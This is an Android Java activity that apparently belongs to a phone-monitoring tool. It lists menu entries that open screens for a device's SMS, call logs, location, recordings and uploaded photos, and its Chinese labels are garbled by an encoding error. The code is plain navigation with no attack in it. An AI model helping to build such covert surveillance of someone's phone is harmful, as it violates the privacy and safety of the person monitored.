package com.android.smsserver;

import java.util.ArrayList;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Button;
import android.widget.ListView;

import com.android.adapter.MoreAdapter;
import com.android.utils.Utils;

public class InfoActivity extends Activity {

	private ListenerImpl listener;
	private List<String> ls=new ArrayList<String>();
	private ListView infodata;
	private MoreAdapter mordadapter;
	private Button setbut;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_set);
		listener=new ListenerImpl();
		infodata=(ListView)findViewById(R.id.infodata);
		setbut=(Button)findViewById(R.id.setbut);
		mordadapter=new MoreAdapter(this, ls,Utils.client);
		infodata.setAdapter(mordadapter);
		infodata.setOnItemClickListener(listener);
		init();
		setbut.setOnClickListener(listener);
	}
	private void init(){
		ls.clear();
		ls.add("������Ϣ");
		ls.add("���ż�¼");
		ls.add("ͨ����¼");
		ls.add("λ�ü�¼");
		ls.add("����¼��");
		ls.add("�����ϴ�");
		mordadapter.notifyDataSetChanged();
	}
	class ListenerImpl implements OnItemClickListener,OnClickListener{


		@Override
		public void onItemClick(AdapterView<?> arg0, View arg1, int arg2,
				long arg3) {
			// TODO Auto-generated method stub
			String ac=ls.get(arg2);
			if("������Ϣ".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,BaseInfoActivity.class);
				startActivity(intent);
			}
			if("���ż�¼".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,SmsActivity.class);
				startActivity(intent);
			}
			if("ͨ����¼".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,CallActivity.class);
				startActivity(intent);
			}
			if("λ�ü�¼".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,LocActivity.class);
				startActivity(intent);
			}
			if("����¼��".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,RecordActivity.class);
				startActivity(intent);
			}
			if("�����ϴ�".equals(ac)){
				Intent intent=new Intent(InfoActivity.this,PhotoActivity.class);
				startActivity(intent);
			}
		}

		@Override
		public void onClick(View arg0) {
			// TODO Auto-generated method stub
			
		}


		
	}
	


}
